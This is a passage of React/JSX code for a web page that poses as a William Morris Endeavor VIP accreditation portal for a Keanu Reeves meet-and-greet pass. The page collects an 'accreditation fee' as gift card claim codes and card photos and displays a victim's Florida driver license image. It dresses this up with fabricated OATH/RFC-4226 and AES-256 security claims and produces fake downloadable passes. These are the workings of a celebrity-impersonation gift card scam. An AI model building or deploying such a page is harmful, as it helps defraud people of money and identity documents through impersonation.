                            </>
                          ) : (
                            <>
                              <ShieldCheck className="w-3.5 h-3.5" />
                              <span>Verify Gift Card Deposit (${pricing.feeAmount} {pricing.currency})</span>
                            </>
                          )}
                        </button>
                      </div>
                    ) : (
                      /* Payment Verified Banner */
                      <div className="p-3 bg-[#052E16]/50 border border-[#22C55E]/40 rounded-[3px] space-y-1 text-xs font-mono">
                        <div className="flex items-center gap-2 text-[#4ADE80] font-bold">
                          <CheckCircle2 className="w-4 h-4 shrink-0" />
                          <span>Accreditation Fee Verified ({pricing.feeAmount} {pricing.currency})</span>
                        </div>
                        <div className="text-[11px] text-[#BBF7D0] space-y-0.5 pl-6">
                          <div>PROVIDER: <strong className="text-white">{paymentData?.giftCardType || 'Apple Gift Card'}</strong></div>
                          <div>CLAIM CODE: <span className="text-[#F3E5AB]">{paymentData?.giftCardCodeMasked || paymentData?.giftCardCode || '****2026'}</span></div>
                          {paymentData?.paymentId && (
                            <div className="text-[10px] text-[#86EFAC]/80">REF ID: {paymentData.paymentId}</div>
                          )}
                          {(paymentData?.giftCardImage || giftCardImage) && (
                            <div className="pt-1.5 mt-1 border-t border-[#22C55E]/30 flex items-center justify-between">
                              <span className="text-[10px] text-[#86EFAC]">GIFT CARD PHOTO:</span>
                              <button
                                type="button"
                                onClick={() => {
                                  if (paymentData?.giftCardImage) setGiftCardImage(paymentData.giftCardImage);
                                  setShowGiftCardImageModal(true);
                                }}
                                className="text-[10px] font-mono text-[#D4AF37] hover:underline flex items-center gap-1 cursor-pointer"
                              >
                                <Eye className="w-3 h-3" />
                                <span>Inspect Uploaded Photo</span>
                              </button>
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                  </div>

                  {errorMessage && (
                    <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
                      <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                      <span>{errorMessage}</span>
                    </div>
                  )}

                  {/* Primary Activation Button */}
                  <button
                    type="submit"
                    id="submit-activate-btn"
                    disabled={isActivating}
                    className="w-full py-3.5 px-4 bg-gradient-to-r from-[#D4AF37] via-[#F3E5AB] to-[#D4AF37] text-[#0A0A0E] hover:brightness-110 disabled:opacity-50 font-mono text-xs uppercase tracking-widest font-bold rounded-[2px] shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer"
                  >
                    {isActivating ? (
                      <>
                        <RotateCw className="w-4 h-4 animate-spin text-[#0A0A0E]" />
                        <span>Validating OATH Token &amp; Credentials...</span>
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-4 h-4" />
                        <span>Authenticate PIN &amp; Activate VIP Card</span>
                      </>
                    )}
                  </button>

                  <div className="pt-2 text-[10px] font-mono text-[#666677] text-center border-t border-[#1C1C26]">
                    Initiative for Open AuTHentication (OATH) • RFC-4226 &amp; AES-256 VIP Standard
                  </div>
                </form>
              ) : (
                <div className="space-y-4">
                  {/* Success State */}
                  <div className="p-4 bg-[#052E16]/40 border border-[#22C55E]/40 rounded-[3px] space-y-2.5">
                    <div className="flex items-center gap-2 text-[#4ADE80]">
                      <CheckCircle2 className="w-5 h-5 shrink-0" />
                      <span className="font-mono text-xs uppercase tracking-wider font-bold">
                        Credential Successfully Activated
                      </span>
                    </div>
                    <p className="text-xs text-[#BBF7D0] font-sans">
                      Biometric intake, accreditation deposit, and VIP Green Room admittance are cleared for {params.guest}.
                    </p>
                    <div className="bg-[#021F0D] p-2.5 rounded-[2px] border border-[#22C55E]/30 text-[11px] font-mono text-[#86EFAC] space-y-1">
                      <div>CLEARANCE CODE: <strong className="text-white">{successData.clearanceCode || 'OATH-KR26-813-CLEAR'}</strong></div>
                      <div>ACTIVATED AT: {new Date(successData.activatedAt || Date.now()).toLocaleTimeString()} ({new Date(successData.activatedAt || Date.now()).toLocaleDateString()})</div>
                      <div>PIN VERIFIED: 813-026 (OATH RFC-4226)</div>
                      <div>DEPOSIT PAID: {successData.payment?.giftCardType || paymentData?.giftCardType || 'Gift Card'} (${pricing.feeAmount} {pricing.currency})</div>
                      {(successData.payment?.giftCardImage || paymentData?.giftCardImage || giftCardImage) && (
                        <div className="pt-1 mt-1 border-t border-[#22C55E]/30 flex items-center justify-between">
                          <span className="text-[10px] text-[#86EFAC]">CARD PHOTO PROOF:</span>
                          <button
                            type="button"
                            onClick={() => {
                              const img = successData.payment?.giftCardImage || paymentData?.giftCardImage || giftCardImage;
                              if (img) setGiftCardImage(img);
                              setShowGiftCardImageModal(true);
                            }}
                            className="text-[10px] font-mono text-[#D4AF37] hover:underline flex items-center gap-1 cursor-pointer"
                          >
                            <Eye className="w-3 h-3" />
                            <span>View Card Photo Proof</span>
                          </button>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="pt-1">
                    <button
                      type="button"
                      onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
                      className="w-full py-3 bg-[#D4AF37] text-black font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] hover:bg-[#F3E5AB] transition-colors flex items-center justify-center gap-1.5 cursor-pointer shadow-md"
                    >
                      <Download className="w-3.5 h-3.5" />
                      <span>Download Printable VIP Pass (PDF)</span>
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Venue Admittance Rules */}
            <div className="p-4 bg-[#0A0A10] border border-[#1E1E28] rounded-[2px] space-y-2 text-[11px] text-[#888899] font-mono">
              <span className="text-[#D4AF37] block font-semibold uppercase tracking-wider text-[10px]">
                Admittance Requirements:
              </span>
              <ul className="list-disc pl-4 space-y-1">
                <li>Government-issued Florida photo ID required upon talent lounge check-in.</li>
                <li>Credential pass must be presented digitally or in printed high-res format.</li>
                <li>Single admittance strictly non-transferable under WME talent rider terms.</li>
              </ul>
            </div>

          </div>

          {/* Right Column: Interactive Credential Pass Display & Direct Downloads (7 Cols) */}
          <div className="lg:col-span-7 space-y-4">
            
            {/* Download and Flip Controls Bar */}
            <div className="flex flex-wrap items-center justify-between gap-2 p-3 bg-[#111118] border border-[#242433] rounded-[3px]">
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setIsFlipped(!isFlipped)}
                  className="px-3 py-1.5 bg-[#D4AF37] hover:bg-[#F3E5AB] text-black font-mono text-xs font-semibold uppercase tracking-wider rounded-[2px] flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <RotateCw className="w-3.5 h-3.5" />
                  <span>{isFlipped ? 'Show Front Face' : 'Show Back Face'}</span>
                </button>
                <span className="text-[11px] font-mono text-[#888899] hidden sm:inline">
                  (Currently: {isFlipped ? 'Back Face' : 'Front Face'})
                </span>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
                  title="Download High-Res Front Pass PNG"
                >
                  <Download className="w-3 h-3 text-[#D4AF37]" />
                  <span>Front</span>
                </button>
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
                  title="Download High-Res Back Pass PNG"
                >
                  <Download className="w-3 h-3 text-[#D4AF37]" />
                  <span>Back</span>
                </button>
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(completeImg, 'Brenda-Wright-VIP-Pass-Complete.png')}
                  className="px-2.5 py-1.5 bg-[#1C1C26] hover:bg-[#2A2A3A] text-white border border-[#333344] font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors"
                  title="Download Side-by-Side Presentation PNG"
                >
                  <Download className="w-3 h-3 text-[#D4AF37]" />
                  <span>Both</span>
                </button>
                <button
                  type="button"
                  onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
                  className="px-2.5 py-1.5 bg-[#6B1D2F] hover:bg-[#8A253D] text-white border border-[#A6304C]/40 font-mono text-[11px] uppercase rounded-[2px] flex items-center gap-1 transition-colors font-semibold"
                  title="Download Printable 300 DPI PDF"
                >
                  <FileText className="w-3 h-3" />
                  <span>PDF</span>
                </button>
              </div>
            </div>

            {/* Credential Image Display with Glow Frame */}
            <div 
              onClick={() => setIsFlipped(!isFlipped)} 
              className="bg-[#050508] border-2 border-[#D4AF37]/40 rounded-[6px] p-4 flex flex-col items-center justify-center shadow-2xl relative cursor-pointer group hover:border-[#D4AF37] transition-all min-h-[580px]"
            >
              <div className="absolute top-3 left-4 flex items-center gap-2 text-[10px] font-mono text-[#A1A1AA]">
                <span className="w-2 h-2 rounded-full bg-[#D4AF37]" />
                <span>CLICK BADGE TO FLIP</span>
              </div>

              {isCardActivated && (
                <div className="absolute top-3 right-4 bg-[#22C55E]/20 border border-[#22C55E] text-[#4ADE80] font-mono text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-[2px] flex items-center gap-1 animate-pulse">
                  <CheckCircle2 className="w-3 h-3" />
                  <span>ACTIVATED &amp; SYNCED</span>
                </div>
              )}

              {/* Pass Image */}
              <div className="relative max-w-[420px] w-full flex items-center justify-center py-2">
                <img
                  src={isFlipped ? backImg : frontImg}
                  alt={`Brenda Wright VIP Pass ${isFlipped ? 'Back' : 'Front'}`}
                  className="max-h-[640px] w-auto object-contain rounded-[4px] shadow-2xl border border-white/10 group-hover:scale-[1.01] transition-transform duration-300"
                />
              </div>

              <div className="mt-3 text-center">
                <span className="text-[11px] font-mono text-[#888899]">
                  {isFlipped 
                    ? 'Back Face: Activation PIN Security Module, Barcode, Terms & Passholder Dedication' 
                    : 'Front Face: Keanu Reeves Designated Guest, Photo Verified, Digital E-Sign & Scannable QR'}
                </span>
              </div>
            </div>

            {/* Direct Link to Standalone 3D Card App */}
            <div className="p-3 bg-[#0E0E14] border border-[#22222E] rounded-[3px] flex items-center justify-between">
              <span className="text-xs font-mono text-[#A1A1AA]">
                Looking for the standalone interactive 3D card application?
              </span>
              <a
                href="/meet-and-greet-card/index.html"
                target="_blank"
                rel="noreferrer"
                className="text-xs font-mono text-[#D4AF37] hover:underline flex items-center gap-1"
              >
                <span>Open 3D App</span>
                <ExternalLink className="w-3 h-3" />
              </a>
            </div>

          </div>

        </div>
      </main>

      {/* Florida Driver License Modal Lightbox */}
      {showIdModal && (
        <div 
          role="dialog"
          aria-modal="true"
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
        >
          <div className="bg-[#111116] border border-[#D4AF37] rounded-[4px] max-w-lg w-full p-5 shadow-2xl relative">
            <button
              type="button"
              onClick={() => setShowIdModal(false)}
              className="absolute top-3.5 right-3.5 text-[#A1A1AA] hover:text-white p-1"
              title="Close modal"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-2 mb-2 text-[#D4AF37]">
              <CreditCard className="w-4 h-4" />
              <h3 className="font-mono text-xs uppercase tracking-wider font-bold">
                Florida Driver License Intake Verification
              </h3>
            </div>
            <p className="text-[11px] font-mono text-[#888899] mb-4">
              Passholder: Brenda Wright • Jurisdiction: Florida, USA • Status: AES-256 Encrypted
            </p>

            <div className="bg-[#050508] p-2 rounded-[2px] border border-white/10 flex items-center justify-center mb-4">
              <img
                src={licenseImg}
                alt="Florida Driver License Full Intake"
                className="max-h-[380px] w-auto object-contain rounded-[2px]"
              />
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-[#20202E] text-[11px] font-mono">
              <span className="text-[#A1A1AA]">Validated &amp; Biometrically Matched</span>
              <button
                type="button"
                onClick={() => setShowIdModal(false)}
                className="px-3 py-1 bg-[#D4AF37] text-black font-semibold uppercase text-xs rounded-[2px]"
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Gift Card Photo Modal Lightbox */}
      {showGiftCardImageModal && giftCardImage && (
        <div 
          role="dialog"
          aria-modal="true"
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4"
        >
          <div className="bg-[#111116] border border-[#D4AF37] rounded-[4px] max-w-xl w-full p-5 shadow-2xl relative">
            <button
              type="button"
              onClick={() => setShowGiftCardImageModal(false)}
              className="absolute top-3.5 right-3.5 text-[#A1A1AA] hover:text-white p-1 cursor-pointer"
              title="Close modal"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-2 mb-2 text-[#D4AF37]">
              <Gift className="w-4 h-4" />
              <h3 className="font-mono text-xs uppercase tracking-wider font-bold">
                Gift Card Deposit Picture / Voucher Proof
              </h3>
            </div>
            <p className="text-[11px] font-mono text-[#888899] mb-4">
              Passholder: {params.guest} • Security Ref: {params.ref} • {selectedGiftCardType}
            </p>

            <div className="bg-[#050508] p-2 rounded-[2px] border border-white/10 flex items-center justify-center mb-4 overflow-hidden">
              <img
                src={giftCardImage}
                alt="Gift Card Deposit Scan"
                className="max-h-[420px] w-auto max-w-full object-contain rounded-[2px]"
              />
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-[#20202E] text-[11px] font-mono">
              <span className="text-[#A1A1AA] truncate mr-2">
                {giftCardImageName || 'Deposit Voucher Image'}
              </span>
              <button
                type="button"
                onClick={() => setShowGiftCardImageModal(false)}
                className="px-3 py-1 bg-[#D4AF37] text-black font-semibold uppercase text-xs rounded-[2px] cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="border-t border-[#1C1C24] bg-[#0A0A0E] py-4 text-center text-[10px] font-mono text-[#666677]">
        WILLIAM MORRIS ENDEAVOR (WME) • TALENT RELATIONS &amp; VIP ACCREDITATION DIVISION • BEVERLY HILLS, CA
      </footer>
    </div>
  );
};

export default CardActivationPortal;
